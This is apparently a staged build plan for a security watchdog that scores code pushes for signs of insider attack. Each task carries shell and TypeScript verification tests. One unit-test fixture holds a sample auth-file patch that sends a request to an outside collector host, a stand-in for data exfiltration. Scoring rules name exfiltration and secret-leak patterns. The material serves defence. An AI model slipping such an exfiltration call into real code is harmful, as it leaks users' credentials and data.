npx tsx --input-type=module -e "import('./lib/signals/structural.ts').then(({ detectNewDependency }) => { const patch = '+    \\\"sketchy-package\\\": \\\"^0.0.1\\\",\\n+    \\\"another-new\\\": \\\"^1.2.3\\\"'; const r = detectNewDependency({ path: 'package.json', patch }); if (!r.matched || r.evidence.length !== 2) { console.error('expected 2 new deps', r); process.exit(1); } if (r.evidence[0].name !== 'sketchy-package') { console.error('bad parse', r); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./lib/signals/structural.ts').then(({ detectNewDependency }) => { const r = detectNewDependency({ path: 'lib/utils.ts', patch: '+import x from \\'foo\\'' }); if (r.matched) { console.error('false positive on non-package.json'); process.exit(1); } console.log('OK'); })"
```

#### T2.2.6 — Signal #6: new API endpoint

**Description:** Add `detectNewEndpoint(file)`. Matches when a new file under `app/api/` is added (additions == file size, deletions == 0). Severity depends on path (critical paths get higher severity).

**Requires:** T2.2.5

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/signals/structural.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./lib/signals/structural.ts').then(({ detectNewEndpoint }) => { const r = detectNewEndpoint({ path: 'app/api/admin/wipe/route.ts', additions: 40, deletions: 0, status: 'added' }); if (!r.matched) { console.error('miss on new admin endpoint'); process.exit(1); } if (r.severity < 0.6) { console.error('low severity for admin path', r); process.exit(1); } const r2 = detectNewEndpoint({ path: 'app/api/healthz/route.ts', additions: 10, deletions: 0, status: 'added' }); if (!r2.matched) { console.error('miss on new healthz'); process.exit(1); } if (r2.severity > r.severity) { console.error('healthz should be lower severity than admin'); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./lib/signals/structural.ts').then(({ detectNewEndpoint }) => { const r = detectNewEndpoint({ path: 'app/api/admin/route.ts', additions: 20, deletions: 5, status: 'modified' }); if (r.matched) { console.error('false positive on modified file'); process.exit(1); } console.log('OK'); })"
```

#### T2.2.7 — Wire signals into `workflows/steps/extract-signals.ts`

**Description:** Single step file that imports all 6 detectors, runs them across every changed file in the ingested diff, returns `{ structural: { signal_id: matches[] } }`.

**Requires:** T2.2.6

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: workflows/steps/extract-signals.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./workflows/steps/extract-signals.ts').then(async ({ extractSignals }) => { const fakeIngest = { files: [ { path: 'lib/auth.ts', patch: '+await fetch(\\'https://stats-collector.io/track\\')', additions: 1, deletions: 0, status: 'modified' }, { path: 'package.json', patch: '+    \\\"new-dep\\\": \\\"^1.0.0\\\"', additions: 1, deletions: 0, status: 'modified' } ] }; const out = await extractSignals(fakeIngest); if (!out.structural) { console.error('no structural'); process.exit(1); } const ids = Object.keys(out.structural); if (ids.length < 2) { console.error('expected 2+ signal hits, got', ids); process.exit(1); } console.log('OK ' + ids.join(',')); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./workflows/steps/extract-signals.ts').then(async ({ extractSignals }) => { const empty = { files: [{ path: 'README.md', patch: '+## hi', additions: 1, deletions: 0, status: 'modified' }] }; const out = await extractSignals(empty); const total = Object.values(out.structural || {}).reduce((a, b) => a + b.length, 0); if (total > 0) { console.error('expected 0 hits on README change, got', out); process.exit(1); } console.log('OK 0-hit baseline'); })"
```

### T2.3 — Temporal signals

#### T2.3.1 — `lib/signals/temporal.ts`

**Description:** Three checks: off-hours (push outside `OFFICE_HOURS_START`–`OFFICE_HOURS_END` env vars, default 09–18 UTC), weekend, rapid-succession (compare `pushed_at` to last deploy timestamp from `kv.list('deploys:')` — flag if delta < 60s). Returns `{ off_hours: bool, weekend: bool, rapid_succession: bool, severity: 0–1 }`.

**Requires:** T2.2.7

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/signals/temporal.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./lib/signals/temporal.ts').then(async ({ detectTemporal }) => { const r1 = await detectTemporal({ pushed_at: '2026-05-02T03:42:00Z' }); if (!r1.off_hours) { console.error('miss on 03:42 UTC'); process.exit(1); } const r2 = await detectTemporal({ pushed_at: '2026-05-02T14:00:00Z' }); if (r2.off_hours) { console.error('false positive on 14:00 UTC'); process.exit(1); } const r3 = await detectTemporal({ pushed_at: '2026-05-03T14:00:00Z' }); if (!r3.weekend) { console.error('miss on Sunday'); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./lib/signals/temporal.ts').then(async ({ detectTemporal }) => { require('dotenv').config({path:'.env.local'}); const r = await detectTemporal({ pushed_at: new Date().toISOString() }); if (typeof r.severity !== 'number') { console.error('bad severity'); process.exit(1); } console.log('OK sev=' + r.severity); })"
```

### T2.4 — Behavioral signals (KV-lookup)

#### T2.4.1 — `lib/signals/behavioral.ts` — author-path mismatch

**Description:** `detectAuthorPathMismatch({ author, files })` reads `history:author:{login}` from KV (set of touched dirs over last 30 days). Returns matched=true when any current touched dir is NOT in the author's set.

**Requires:** T2.3.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/signals/behavioral.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./lib/signals/behavioral.ts').then(async ({ detectAuthorPathMismatch }) => { import('./lib/db.ts').then(async ({ kv }) => { require('dotenv').config({path:'.env.local'}); await kv.set('history:author:test-user', JSON.stringify(['components/ui'])); const r = await detectAuthorPathMismatch({ author: 'test-user', files: [{ path: 'lib/auth.ts' }] }); if (!r.matched) { console.error('miss on novel area'); process.exit(1); } const r2 = await detectAuthorPathMismatch({ author: 'test-user', files: [{ path: 'components/ui/Foo.tsx' }] }); if (r2.matched) { console.error('false positive on home area'); process.exit(1); } await kv.del('history:author:test-user'); console.log('OK'); }); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./lib/signals/behavioral.ts').then(async ({ detectAuthorPathMismatch }) => { const r = await detectAuthorPathMismatch({ author: 'unknown-user-zzzzzz', files: [{ path: 'lib/auth.ts' }] }); if (!r.matched) { console.error('expected match on unknown author'); process.exit(1); } console.log('OK unknown=match'); })"
```

#### T2.4.2 — File-hour novelty

**Description:** `detectFileHourNovelty({ files, pushed_at })` reads `history:hour:{path}` (24-element array, count per hour). Returns matched=true when current hour count == 0 for any modified file.

**Requires:** T2.4.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/signals/behavioral.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./lib/signals/behavioral.ts').then(async ({ detectFileHourNovelty }) => { import('./lib/db.ts').then(async ({ kv }) => { require('dotenv').config({path:'.env.local'}); const hist = new Array(24).fill(0); hist[14] = 5; hist[15] = 3; await kv.set('history:hour:lib/test.ts', JSON.stringify(hist)); const r1 = await detectFileHourNovelty({ files: [{ path: 'lib/test.ts' }], pushed_at: '2026-05-02T03:00:00Z' }); if (!r1.matched) { console.error('miss on novel hour 3'); process.exit(1); } const r2 = await detectFileHourNovelty({ files: [{ path: 'lib/test.ts' }], pushed_at: '2026-05-02T14:30:00Z' }); if (r2.matched) { console.error('false positive on familiar hour 14'); process.exit(1); } await kv.del('history:hour:lib/test.ts'); console.log('OK'); }); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./lib/signals/behavioral.ts').then(async ({ detectFileHourNovelty }) => { const r = await detectFileHourNovelty({ files: [{ path: 'lib/never-seen-file.ts' }], pushed_at: new Date().toISOString() }); if (!r.matched) { console.error('expected match for unseen file'); process.exit(1); } console.log('OK'); })"
```

#### T2.4.3 — File-co-change novelty

**Description:** `detectCochangeNovelty({ files })` for every pair (a,b) in the changed file set, reads `history:cochange:{a}:{b}` count. Returns matched=true if any pair has count 0 (never co-changed before).

**Requires:** T2.4.2

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/signals/behavioral.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./lib/signals/behavioral.ts').then(async ({ detectCochangeNovelty }) => { import('./lib/db.ts').then(async ({ kv }) => { require('dotenv').config({path:'.env.local'}); await kv.set('history:cochange:lib/a.ts:lib/b.ts', '5'); const r1 = await detectCochangeNovelty({ files: [{ path: 'lib/a.ts' }, { path: 'lib/b.ts' }] }); if (r1.matched) { console.error('false positive on familiar pair'); process.exit(1); } const r2 = await detectCochangeNovelty({ files: [{ path: 'lib/a.ts' }, { path: 'lib/never-paired.ts' }] }); if (!r2.matched) { console.error('miss on novel pair'); process.exit(1); } await kv.del('history:cochange:lib/a.ts:lib/b.ts'); console.log('OK'); }); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./lib/signals/behavioral.ts').then(async ({ detectCochangeNovelty }) => { const r = await detectCochangeNovelty({ files: [{ path: 'lib/x.ts' }] }); if (r.matched) { console.error('single-file should not match'); process.exit(1); } console.log('OK single-file=no-match'); })"
```

#### T2.4.4 — Update history records on every push

**Description:** `updateHistory({ author, files, pushed_at })` appends to `history:author:{login}`, increments `history:hour:{path}[hour]`, increments `history:cochange:{a}:{b}` for all unordered pairs. Called from `extract-signals` AFTER signal evaluation (so signals see pre-push state).

**Requires:** T2.4.3

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/signals/behavioral.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./lib/signals/behavioral.ts').then(async ({ updateHistory }) => { import('./lib/db.ts').then(async ({ kv }) => { require('dotenv').config({path:'.env.local'}); const author = 'hist_test_' + Date.now(); await updateHistory({ author, files: [{ path: 'lib/x.ts' }, { path: 'lib/y.ts' }], pushed_at: '2026-05-02T14:00:00Z' }); const a = JSON.parse(await kv.get('history:author:' + author) || '[]'); if (!a.includes('lib')) { console.error('author dirs not updated', a); process.exit(1); } const h = JSON.parse(await kv.get('history:hour:lib/x.ts') || '[]'); if (h[14] !== 1) { console.error('hour bucket not incremented', h); process.exit(1); } const cc = await kv.get('history:cochange:lib/x.ts:lib/y.ts'); if (Number(cc) !== 1) { console.error('cochange not incremented', cc); process.exit(1); } await kv.del('history:author:' + author); await kv.del('history:hour:lib/x.ts'); await kv.del('history:hour:lib/y.ts'); await kv.del('history:cochange:lib/x.ts:lib/y.ts'); console.log('OK'); }); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./lib/signals/behavioral.ts').then(async ({ updateHistory }) => { import('./lib/db.ts').then(async ({ kv }) => { require('dotenv').config({path:'.env.local'}); const author = 'idempotent_test_' + Date.now(); await updateHistory({ author, files: [{ path: 'lib/z.ts' }], pushed_at: '2026-05-02T14:00:00Z' }); await updateHistory({ author, files: [{ path: 'lib/z.ts' }], pushed_at: '2026-05-02T14:00:00Z' }); const h = JSON.parse(await kv.get('history:hour:lib/z.ts') || '[]'); if (h[14] !== 2) { console.error('expected hour count = 2 after 2 pushes, got', h[14]); process.exit(1); } await kv.del('history:author:' + author); await kv.del('history:hour:lib/z.ts'); console.log('OK'); }); })"
```

### T2.5 — Scoring

#### T2.5.1 — `lib/score.ts` — formula

**Description:** Implement `score({ structural, behavioral, temporal, compounds })` returning `0.35*structural + 0.35*behavioral + 0.15*temporal + 0.15*compound_bonus`. Each input is a normalized 0–1 max severity from its detector group. Inputs outside [0,1] are clamped (negative → 0, >1 → 1). Inputs that are `null`/`undefined`/`NaN` default to 0. Returns a finite number in [0,1].

**Requires:** T2.4.4

**Verify:**

```bash
# tier1_build
npx tsc --noEmit --strict -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/score.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
import { score, WEIGHTS } from './lib/score.ts';
const close = (a, b) => Math.abs(a - b) < 0.001;
const cases = [
  // Happy: max in
  { name: 'happy: all 1s → 1.0', input: { structural: 1, behavioral: 1, temporal: 1, compounds: 1 }, expect: 1.0 },
  // Negative: zero in
  { name: 'negative: all 0s → 0.0', input: { structural: 0, behavioral: 0, temporal: 0, compounds: 0 }, expect: 0.0 },
  // Edge: weight per dimension proven via single-axis input
  { name: 'edge: pure structural=1 → 0.35', input: { structural: 1, behavioral: 0, temporal: 0, compounds: 0 }, expect: 0.35 },
  { name: 'edge: pure behavioral=1 → 0.35', input: { structural: 0, behavioral: 1, temporal: 0, compounds: 0 }, expect: 0.35 },
  { name: 'edge: pure temporal=1 → 0.15', input: { structural: 0, behavioral: 0, temporal: 1, compounds: 0 }, expect: 0.15 },
  { name: 'edge: pure compounds=1 → 0.15', input: { structural: 0, behavioral: 0, temporal: 0, compounds: 1 }, expect: 0.15 },
  // Adversarial: out-of-range clamping
  { name: 'adversarial: structural=2 clamped to 1', input: { structural: 2, behavioral: 0, temporal: 0, compounds: 0 }, expect: 0.35 },
  { name: 'adversarial: structural=-1 clamped to 0', input: { structural: -1, behavioral: 1, temporal: 0, compounds: 0 }, expect: 0.35 },
  { name: 'adversarial: NaN structural defaults to 0', input: { structural: NaN, behavioral: 1, temporal: 0, compounds: 0 }, expect: 0.35 },
  { name: 'adversarial: undefined fields default to 0', input: { behavioral: 1 }, expect: 0.35 },
  { name: 'adversarial: empty object → 0', input: {}, expect: 0.0 },
  { name: 'adversarial: null input → 0 (no throw)', input: null, expect: 0.0 },
  // Property: result always in [0,1]
  { name: 'property: extreme positive overshoot still ≤ 1', input: { structural: 100, behavioral: 100, temporal: 100, compounds: 100 }, expect: 1.0 },
];
for (const c of cases) {
  const got = score(c.input);
  if (!close(got, c.expect)) { console.error('FAIL', c.name, 'expected', c.expect, 'got', got); process.exit(1); }
}
// Property: weights sum to 1.0
const w = WEIGHTS.structural + WEIGHTS.behavioral + WEIGHTS.temporal + WEIGHTS.compounds;
if (Math.abs(w - 1.0) > 0.0001) { console.error('weights do not sum to 1.0:', w); process.exit(1); }
// Property: 1000 random inputs all yield finite [0,1]
for (let i = 0; i < 1000; i++) {
  const r = score({ structural: Math.random(), behavioral: Math.random(), temporal: Math.random(), compounds: Math.random() });
  if (!Number.isFinite(r) || r < 0 || r > 1) { console.error('property violated at iter', i, ':', r); process.exit(1); }
}
console.log('OK ' + cases.length + ' cases + weight-sum + 1k property samples');
"
```

```bash
# tier4_integration
# Cross-stage: feed real signal severities through the formula. Idempotence: same input → same output across 3 calls.
npx tsx --input-type=module -e "
import { score } from './lib/score.ts';

// (1) Demo scenario — must land in critical bucket (>=0.8)
const demo = score({ structural: 0.88, behavioral: 0.72, temporal: 0.94, compounds: 0.85 });
if (demo < 0.80 || demo > 0.92) { console.error('demo case out of expected band [0.80, 0.92]:', demo); process.exit(1); }

// (2) Bucket boundary cases — confirm the bucket boundaries (<0.3 benign, 0.3–0.6 watch, 0.6–0.8 investigate, >0.8 critical) are reachable
const boundaries = [
  { input: { structural: 0.2, behavioral: 0.1, temporal: 0, compounds: 0 }, expectBand: [0.0, 0.3] },   // benign
  { input: { structural: 0.6, behavioral: 0.5, temporal: 0.4, compounds: 0.3 }, expectBand: [0.4, 0.7] },// watch/investigate boundary
  { input: { structural: 0.95, behavioral: 0.9, temporal: 0.8, compounds: 0.85 }, expectBand: [0.85, 1.0] }, // critical
];
for (const b of boundaries) {
  const r = score(b.input);
  if (r < b.expectBand[0] || r > b.expectBand[1]) { console.error('bucket boundary FAIL', b, '→', r); process.exit(1); }
}

// (3) Idempotence
const inp = { structural: 0.5, behavioral: 0.7, temporal: 0.3, compounds: 0.2 };
const r1 = score(inp); const r2 = score(inp); const r3 = score(inp);
if (r1 !== r2 || r2 !== r3) { console.error('not idempotent', r1, r2, r3); process.exit(1); }

// (4) Pure: input mutation does not affect prior result
const inp2 = { structural: 0.5, behavioral: 0.5, temporal: 0.5, compounds: 0.5 };
const before = score(inp2);
inp2.structural = 1.0;
const after = score(inp2);
if (before === after) { console.error('mutation should change later result, got same', before, after); process.exit(1); }

console.log('OK demo=' + demo.toFixed(2) + ' · 3 boundaries · idempotent · pure');
"
```

#### T2.5.2 — Compound rules

**Description:** Add `compoundBonus({ signals })` that returns 1.0 when any of these triples fire (all required), otherwise 0:

| Triple | Signals (all must be true) | Story |
|---|---|---|
| AUTH_EXFIL_OFFHOURS | `auth_path` ∧ `external_fetch` ∧ `off_hours` | The headline scenario A pattern |
| CRITICAL_NOVEL | `critical_path` ∧ `novel_author` | Scenario B pattern (untrusted person on critical path) |
| DEP_PAYMENTS | `new_dependency` ∧ `payments_file` | Supply-chain risk in payment code |

Also exports `firingTriples({ signals })` returning the array of named triples that fired (for the war-room "compounds" pill in evidence).

**Requires:** T2.5.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit --strict -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/score.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
import { compoundBonus, firingTriples } from './lib/score.ts';
const cases = [
  // Happy: each triple fires independently
  { name: 'happy: AUTH_EXFIL_OFFHOURS', signals: { auth_path: true, external_fetch: true, off_hours: true }, expect: 1, expectTriples: ['AUTH_EXFIL_OFFHOURS'] },
  { name: 'happy: CRITICAL_NOVEL', signals: { critical_path: true, novel_author: true }, expect: 1, expectTriples: ['CRITICAL_NOVEL'] },
  { name: 'happy: DEP_PAYMENTS', signals: { new_dependency: true, payments_file: true }, expect: 1, expectTriples: ['DEP_PAYMENTS'] },
  // Negative: no triple complete
  { name: 'negative: empty signals', signals: {}, expect: 0, expectTriples: [] },
  { name: 'negative: 2 of 3 triple signals', signals: { auth_path: true, external_fetch: true /* missing off_hours */ }, expect: 0, expectTriples: [] },
  { name: 'negative: single signal', signals: { auth_path: true }, expect: 0, expectTriples: [] },
  // Edge: extra unrelated signals don't suppress
  { name: 'edge: extra signals + AUTH triple still fires', signals: { auth_path: true, external_fetch: true, off_hours: true, weekend: true, secrets: true }, expect: 1, expectTriples: ['AUTH_EXFIL_OFFHOURS'] },
  // Edge: two triples fire simultaneously → still bonus = 1, but firingTriples reports both
  { name: 'edge: two triples fire — bonus=1, both reported', signals: { auth_path: true, external_fetch: true, off_hours: true, critical_path: true, novel_author: true }, expect: 1, expectTriples: ['AUTH_EXFIL_OFFHOURS', 'CRITICAL_NOVEL'] },
  // Edge: signals=null/undefined
  { name: 'edge: null signals → 0', signals: null, expect: 0, expectTriples: [] },
  { name: 'edge: undefined signals → 0', signals: undefined, expect: 0, expectTriples: [] },
  // Adversarial: signal name typo (e.g., auth_paths vs auth_path) must NOT match
  { name: 'adversarial: typo auth_paths does not match auth_path', signals: { auth_paths: true, external_fetch: true, off_hours: true }, expect: 0, expectTriples: [] },
  // Adversarial: truthy non-boolean (1, 'yes') — implementation must use strict ===true OR document the coercion
  { name: 'edge: numeric 1 treated as true (truthy semantics)', signals: { auth_path: 1, external_fetch: 1, off_hours: 1 }, expect: 1, expectTriples: ['AUTH_EXFIL_OFFHOURS'] },
  { name: 'edge: explicit false suppresses', signals: { auth_path: true, external_fetch: false, off_hours: true }, expect: 0, expectTriples: [] },
];
for (const c of cases) {
  const r = compoundBonus({ signals: c.signals });
  if (r !== c.expect) { console.error('FAIL bonus', c.name, 'expected', c.expect, 'got', r); process.exit(1); }
  const t = firingTriples({ signals: c.signals }).sort();
  const e = [...c.expectTriples].sort();
  if (JSON.stringify(t) !== JSON.stringify(e)) { console.error('FAIL triples', c.name, 'expected', e, 'got', t); process.exit(1); }
}
console.log('OK ' + cases.length + ' cases · 3 triples · typo guard · two-triple coverage');
"
```

```bash
# tier4_integration
# Cross-stage: bonus flows through scoring formula. Three demo scenarios each fire a different triple.
npx tsx --input-type=module -e "
import { score, compoundBonus, firingTriples } from './lib/score.ts';

// Scenario A — auth-exfil at 3 AM (AUTH_EXFIL_OFFHOURS)
const sa = { auth_path: true, external_fetch: true, off_hours: true };
const ca = compoundBonus({ signals: sa });
const ta = firingTriples({ signals: sa });
const finalA = score({ structural: 0.88, behavioral: 0.72, temporal: 0.94, compounds: ca });
if (finalA < 0.80) { console.error('scenario A score too low:', finalA); process.exit(1); }
if (!ta.includes('AUTH_EXFIL_OFFHOURS')) { console.error('scenario A did not fire expected triple', ta); process.exit(1); }

// Scenario B — privesc by novel author on critical path (CRITICAL_NOVEL)
const sb = { critical_path: true, novel_author: true, new_endpoint: true };
const cb = compoundBonus({ signals: sb });
const tb = firingTriples({ signals: sb });
const finalB = score({ structural: 0.85, behavioral: 0.7, temporal: 0.4, compounds: cb });
if (finalB < 0.65) { console.error('scenario B score too low:', finalB); process.exit(1); }
if (!tb.includes('CRITICAL_NOVEL')) { console.error('scenario B did not fire CRITICAL_NOVEL', tb); process.exit(1); }

// Scenario C — secret leak (no compound, but score still high from secrets)
const sc = { secrets: true, critical_path: true };
const cc = compoundBonus({ signals: sc });
if (cc !== 0) { console.error('scenario C should not fire compounds (no full triple)', cc); process.exit(1); }
const finalC = score({ structural: 0.85, behavioral: 0.55, temporal: 0.3, compounds: cc });
if (finalC < 0.5) { console.error('scenario C score too low even without compound', finalC); process.exit(1); }

// Idempotence: same signals → same triples ordering
const t1 = firingTriples({ signals: sa }).join(',');
const t2 = firingTriples({ signals: sa }).join(',');
if (t1 !== t2) { console.error('firingTriples not deterministic', t1, t2); process.exit(1); }

console.log('OK A=' + finalA.toFixed(2) + ' B=' + finalB.toFixed(2) + ' C=' + finalC.toFixed(2) + ' · triples deterministic');
"
```

#### T2.5.3 — `workflows/steps/score.ts`

**Description:** WDK step that takes `{ ingest, signals }` from upstream steps, computes the final score and verdict bucket (`benign` <0.3, `watch` 0.3–0.6, `investigate` 0.6–0.8, `critical` >0.8). Persists to `deploys:{sha}` with full record.

**Requires:** T2.5.2

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: workflows/steps/score.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./workflows/steps/score.ts').then(async ({ scoreStep }) => { const r = await scoreStep({ ingest: { files: [], author: 'x', pushed_at: '2026-05-02T03:42Z', sha: 'xx' }, signals: { structural: { external_fetch: [{ severity: 0.9 }] }, behavioral: {}, temporal: { off_hours: true } } }); if (typeof r.score !== 'number') { console.error('no score', r); process.exit(1); } if (!['benign','watch','investigate','critical'].includes(r.verdict_bucket)) { console.error('bad bucket', r); process.exit(1); } console.log('OK ' + r.verdict_bucket + ' ' + r.score.toFixed(2)); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./workflows/steps/score.ts').then(async ({ scoreStep }) => { import('./lib/db.ts').then(async ({ getDeploy, kv }) => { require('dotenv').config({path:'.env.local'}); const sha = 'sc_' + Date.now().toString(36); await scoreStep({ ingest: { sha, files: [], author: 'x', pushed_at: '2026-05-02T14:00Z' }, signals: {} }); const got = await getDeploy(sha); if (!got || typeof got.score !== 'number') { console.error('not persisted', got); process.exit(1); } await kv.del('deploys:' + sha); console.log('OK persisted'); }); })"
```

### T2.6 — TL;DR generation

#### T2.6.1 — `workflows/steps/summarize.ts`

**Description:** Calls AI Gateway with `anthropic/claude-sonnet-4-6`. Prompt: "Summarize this code change in exactly 2 sentences. First sentence: what changed. Second sentence: the most likely intent. <diff>". Returns `{ tldr: string }`. Persists to the deploy record. Uses `ai` SDK's `generateText`.

**Requires:** T2.5.3

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: workflows/steps/summarize.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./workflows/steps/summarize.ts').then(async ({ summarize }) => { require('dotenv').config({path:'.env.local'}); const r = await summarize({ files: [{ path: 'lib/x.ts', patch: '+export const greeting = \\'hello\\'' }], commit_message: 'add greeting' }); if (typeof r.tldr !== 'string' || r.tldr.length < 10) { console.error('bad tldr', r); process.exit(1); } if (r.tldr.split(/[.!?]\\s/).length < 2) { console.error('expected 2-sentence tldr, got:', r.tldr); process.exit(1); } console.log('OK ' + r.tldr.slice(0, 80)); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./workflows/watchdog.ts').then(async ({ watchdog }) => { import('./lib/db.ts').then(async ({ getDeploy, kv }) => { require('dotenv').config({path:'.env.local'}); const fakeSha = 'e2e_' + Date.now().toString(36); await watchdog({ sha: fakeSha, repo: 'octocat/Hello-World', before: '0', after: '7fd1a60b01f91b314f59955a4e4d4e80d8edf11d' }); const d = await getDeploy(fakeSha); if (!d?.tldr) { console.error('end-to-end pipeline did not produce tldr', d); process.exit(1); } await kv.del('deploys:' + fakeSha); console.log('OK e2e-tldr: ' + d.tldr.slice(0, 80)); }); })"
```

---

## T3 — Wire War Room to Live Data

**Description:** Replace mock data in the war-room frontend with live SSE from the backend.

### T3.1 — SSE hook + component swap

#### T3.1.1 — `lib/sse-events.ts` typed shapes

**Description:** Export TypeScript types for `StatusEvent`, `DeployEvent`, `InvestigatorEvent`, `FeedEvent`, `VerdictEvent`, `ThreatSurfaceEvent` matching raw_prompt §"Live Data" verbatim. Discriminated union on `type` field. `VerdictEvent` must include Slack ack fields: `acknowledged?: boolean`, `acknowledged_by?: string`, `action_taken?: 'ack' | 'hold' | 'page'` — these are set by the Slack pause/resume flow (T5.1.6) and consumed by the VerdictModal badge (T5.1.7) and SuspendedOverlay (T8.1.7). Also export type guards (`isStatusEvent`, `isDeployEvent`, `isInvestigatorEvent`, `isFeedEvent`, `isVerdictEvent`, `isThreatSurfaceEvent`) and a `parseSSEEvent(line: string)` helper that parses one raw SSE `data: ...` line into a typed event (returns `null` on parse failure or unknown `type`). The runtime helpers give T3.1.2's reducer a single dispatch point and give this stage real behavior to verify.

**Requires:** T2.6.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/sse-events.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./lib/sse-events.ts').then((m) => { const ev = m.parseSSEEvent('data: {\"type\":\"status\",\"state\":\"critical\",\"uptime_seconds\":12,\"deploys_analyzed\":47}'); if (!ev || !m.isStatusEvent(ev)) { console.error('parseSSEEvent did not produce a StatusEvent', ev); process.exit(1); } if (ev.state !== 'critical') { console.error('bad state field', ev); process.exit(1); } const bad = m.parseSSEEvent('data: not-json'); if (bad !== null) { console.error('expected null on bad JSON, got', bad); process.exit(1); } const unknown = m.parseSSEEvent('data: {\"type\":\"nope\"}'); if (unknown !== null) { console.error('expected null on unknown type, got', unknown); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./lib/sse-events.ts').then((m) => { const required = ['parseSSEEvent','isStatusEvent','isDeployEvent','isInvestigatorEvent','isFeedEvent','isVerdictEvent','isThreatSurfaceEvent']; const missing = required.filter(k => typeof m[k] !== 'function'); if (missing.length) { console.error('missing exports:', missing); process.exit(1); } const samples = [{ type: 'status', state: 'all_clear', uptime_seconds: 0, deploys_analyzed: 0 }, { type: 'deploy', id: 'x', sha: 'a', author: 'b', pushed_at: 'c', files_changed: [], tldr: 't', score: 0, signals: { structural: [], behavioral: [], temporal: [], compounds: [] } }, { type: 'investigator', deploy_id: 'x', agent: 'history', status: 'idle' }]; for (const s of samples) { const ev = m.parseSSEEvent('data: ' + JSON.stringify(s)); const guard = m['is' + s.type[0].toUpperCase() + s.type.slice(1) + 'Event']; if (!guard(ev)) { console.error('guard rejected own sample', s, ev); process.exit(1); } } console.log('OK'); })"
```

#### T3.1.2 — `useDeploysSSE()` hook

**Description:** React hook that opens an `EventSource` against `/api/stream/deploys`, parses events into typed shapes, and dispatches them to a reducer that maintains the war-room state. Has a `mode: 'demo' | 'live'` switch — `demo` runs the `useDemo` mock orchestration (autoplay loop per T0.3.4), `live` reads from real SSE. **Default `mode='demo'` in BOTH production and dev** so the deployed URL sells the project to a judge who lands on it cold; `mode='live'` requires explicit opt-in via `?live=1` URL param OR the in-page toggle (T8.1.5). Mode persists to `localStorage` under key `bridge.mode` so a bookmark survives the round-trip. Switching modes resets the reducer (mock state cleared on demo→live; mock state restarted on live→demo).

**Requires:** T3.1.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/(warroom)/hooks/useDeploysSSE.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./app/(warroom)/hooks/useDeploysSSE.ts').then((m) => { if (typeof m.useDeploysSSE !== 'function') { console.error('hook missing'); process.exit(1); } if (typeof m.reducer !== 'function') { console.error('reducer missing — needed for unit test'); process.exit(1); } const initial = m.initialState; const next = m.reducer(initial, { type: 'status', state: 'critical', uptime_seconds: 0, deploys_analyzed: 1 }); if (next.state !== 'critical') { console.error('reducer did not handle status event', next); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
(npx next dev -p 3030 > /tmp/dev-t312.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && curl -fsS 'http://localhost:3030/?live=1' | grep -q 'BRIDGE'; ec=$?; pkill -f 'next dev.*3030' || true; exit $ec
```

